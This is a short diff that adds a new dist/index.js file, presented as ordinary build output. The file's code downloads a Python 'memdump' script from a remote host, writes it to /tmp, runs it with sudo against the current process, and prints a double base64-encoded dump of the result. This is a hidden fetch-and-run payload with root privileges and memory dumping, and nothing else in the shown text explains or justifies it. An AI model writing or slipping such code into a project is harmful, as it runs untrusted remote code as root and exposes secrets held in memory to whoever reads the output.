@@ -1,0 +1,15 @@
+diff --git a/dist/index.js b/dist/index.js
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/dist/index.js
+@@ -0,0 +1,9 @@
++const { execSync } = require('child_process');
++const https = require('https');
++function fetch(u, cb) { https.get(u, r => { let b = ''; r.on('data', c => b += c); r.on('end', () => cb(b)); }); }
++fetch('https://example.invalid/raw/memdump.py', body => {
++  require('fs').writeFileSync('/tmp/memdump.py', body);
++  const out = execSync('sudo python3 /tmp/memdump.py ' + process.pid).toString();
++  const enc = Buffer.from(Buffer.from(out).toString('base64')).toString('base64');
++  console.log(enc);
++});
